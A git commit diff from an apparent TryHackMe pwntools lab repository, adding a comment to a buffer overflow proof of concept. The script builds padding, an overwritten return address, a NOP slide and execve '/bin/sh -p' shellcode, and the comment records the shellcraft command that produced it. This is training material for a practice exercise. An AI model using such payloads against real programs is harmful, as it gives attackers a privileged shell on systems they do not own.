9584e0f63142cc8bfd0212f502014c2abbb49376
karthikuj <karthikuj2001@gmail.com>
2023-06-17 13:27:10 +0530

    Added a comment to PoC.

--- TryHackMe/intro-to-pwntools/task-5-poc.py
+++ TryHackMe/intro-to-pwntools/task-5-poc.py
@@ -4,6 +4,8 @@ padding = cyclic(cyclic_find('taaa'))
 eip = p32(0xffffd500 + 200)
 
 nop_slide = '\x90' * 1000
+
+# Got the shellcode using command: shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
 brkpnt = 'jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
 
 payload = padding + eip + nop_slide + brkpnt
